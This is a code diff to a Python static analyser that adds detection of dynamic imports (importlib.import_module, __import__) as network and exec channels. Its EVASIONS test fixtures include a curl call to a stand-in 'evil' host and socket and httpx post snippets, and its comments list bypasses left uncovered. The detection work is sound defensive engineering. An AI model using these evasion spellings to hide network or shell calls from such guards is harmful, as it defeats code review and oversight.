@@ -806,6 +806,29 @@ _OS_EXEC_ATTRS = frozenset({
 })
 _ASYNCIO_EXEC_ATTRS = frozenset({"create_subprocess_exec", "create_subprocess_shell"})
 _ASYNCIO_NET_ATTRS = frozenset({"open_connection", "start_server"})
+
+#: A dynamic import is an import that `visit_Import` cannot see: the module name
+#: is an ARGUMENT, so it never appears in an `import` statement. Both spellings
+#: below bind a module object exactly as `import x` does.
+#:
+#: These are charged AT THE CALL, not through attribute tracking, because the
+#: binding is opaque: `m = importlib.import_module("socket")` gives `m` no
+#: syntactic tie to `socket`, so the INERT_ATTRS carve-out that makes a plain
+#: `import socket` wait for `socket.socket` cannot apply. Charging on sight is
+#: the fail-closed reading, and it is why `socket.gaierror` reached this way
+#: WOULD be reported where the static spelling is not. That asymmetry is
+#: deliberate: nothing in this repo needs the dynamic form for an inert
+#: attribute, and the alternative is a channel that goes quiet on an alias.
+#:
+#: NOT covered, and left uncovered on purpose rather than half-covered:
+#: `getattr(importlib, "import_module")("socket")`, `importlib.__dict__[...]`,
+#: a rebound `f = importlib.import_module; f("socket")`, and `exec("import
+#: socket")`. Each needs value tracking through a different mechanism; this
+#: entry claims the two direct spellings and says so.
+_DYNAMIC_IMPORT_ATTRS: dict[str, frozenset[str]] = {
+    "importlib": frozenset({"import_module"}),
+}
+_DYNAMIC_IMPORT_BUILTIN = "__import__"
 _PTY_EXEC_ATTRS = frozenset({"spawn", "fork"})
 
 #: module -> the attributes of it that run a program.
@@ -870,6 +893,7 @@ class _Analyser(ast.NodeVisitor):
         self.channels: dict[str, list[int]] = {}
         self._mod_aliases: dict[str, str] = {}   # bound name -> canonical module
         self._exec_refs: dict[str, str] = {}     # bound name -> canonical module
+        self._import_refs: set[str] = set()      # `from importlib import import_module`
         self._net_aliases: dict[str, str] = {}   # bound name -> NET_IMPORTS key
         self._exec_aliases: set[str] = set()     # `run = _injected or subprocess.run`
         self._sinks: dict[str, set[tuple[int, str]]] = {}   # name -> {(pos, param)}
@@ -944,6 +968,10 @@ class _Analyser(ast.NodeVisitor):
                 for alias in node.names:
                     if alias.name in attrs:
                         self._exec_refs[alias.asname or alias.name] = exec_module
+        # `from importlib import import_module` binds a bare name that imports.
+        for alias in node.names:
+            if alias.name in _DYNAMIC_IMPORT_ATTRS.get(module, frozenset()):
+                self._import_refs.add(alias.asname or alias.name)
 
     @staticmethod
     def _net_key(dotted: str) -> str:
@@ -1014,6 +1042,32 @@ class _Analyser(ast.NodeVisitor):
                 self._head_mutated.add(f.value.id)
             elif f.attr in _TAIL_MUTATORS:
                 self._tail_mutated.add(f.value.id)
+        imported = self._dynamic_import_name(node)
+        if imported is not None:
+            # An import spelled as a call. `import:<dynamic>` is not an `exec:`
+            # channel, so reach_of() reads it as EXTERNAL without a table entry
+            # — a module chosen at runtime cannot be classified, and must not
+            # be silent. A named module goes through the same classifier as a
+            # static import, so an inert one (`__import__("time")`, live in
+            # cli/commands.py) stays silent exactly as `import time` does.
+            if imported == DYNAMIC:
+                channel = f"import:{DYNAMIC}"
+            elif imported in EXEC_ATTRS:
+                # `__import__("subprocess").run(["curl", …])`. classify_import
+                # calls subprocess INERT and is right to: a static `import
+                # subprocess` is charged by the argv of what it RUNS, not by
+                # the import. That machinery follows a bound name, and this
+                # binding has none — so the import classifier says nothing and
+                # the exec classifier never sees it. Charging the program as
+                # unnameable is what stops the pair going quiet together; the
+                # argv is legible here, but reading it through an opaque
+                # binding is value tracking this guard does not do, and a
+                # channel that says "cannot name it" is the honest report.
+                channel = f"exec:{DYNAMIC}"
+            else:
+                channel = classify_import(imported)
+            if channel is not None:
+                self._add(channel, node.lineno)
         kind = self._call_kind(node)
         if kind == "exec-varargs":
             # asyncio.create_subprocess_exec("git", "merge-base", HEAD, ref):
@@ -1080,6 +1134,30 @@ class _Analyser(ast.NodeVisitor):
         if isinstance(f, ast.Attribute):
             return f.attr
         return f.id if isinstance(f, ast.Name) else None
+
+    def _dynamic_import_name(self, node: ast.Call) -> str | None:
+        """The module a dynamic import names, DYNAMIC if it is built at runtime,
+        or None if *node* is not a dynamic import.
+
+        Resolves `importlib.import_module`, `il.import_module` (aliased import)
+        and a bare `import_module` imported `from importlib`, plus the
+        `__import__` builtin. The alias arm is not hypothetical: `import
+        subprocess as _sp` is what refuted the first version of this guard, and
+        an alias would evade this one the same way.
+        """
+        f = node.func
+        if isinstance(f, ast.Name):
+            dynamic = f.id == _DYNAMIC_IMPORT_BUILTIN or f.id in self._import_refs
+        elif isinstance(f, ast.Attribute) and isinstance(f.value, ast.Name):
+            module = self._mod_aliases.get(f.value.id)
+            dynamic = f.attr in _DYNAMIC_IMPORT_ATTRS.get(module or "", frozenset())
+        else:
+            dynamic = False
+        if not dynamic:
+            return None
+        if not node.args:
+            return DYNAMIC
+        return _const_str(node.args[0]) or DYNAMIC
 
     def _exec_module_of(self, node: ast.AST) -> str | None:
         """The module whose exec entry point *node* refers to, or None.
@@ -1844,6 +1922,19 @@ EVASIONS: dict[str, str] = {
         'import httpx\ngetattr(httpx, "post")(u)\n',
     "raw socket":
         'import socket\ns = socket.socket()\ns.connect((h, p))\n',
+    "importlib.import_module":
+        'import importlib\nm = importlib.import_module("socket")\n'
+        'm.socket().connect((h, p))\n',
+    "importlib aliased":
+        'import importlib as il\nil.import_module("httpx").post(u)\n',
+    "import_module imported by name":
+        'from importlib import import_module\nimport_module("httpx").post(u)\n',
+    "__import__ builtin":
+        '__import__("socket").socket().connect((h, p))\n',
+    "__import__ of an exec module":
+        '__import__("subprocess").run(["curl", "https://evil"])\n',
+    "module name built at runtime":
+        'import importlib\nimportlib.import_module(name).post(u)\n',
 }
 
 
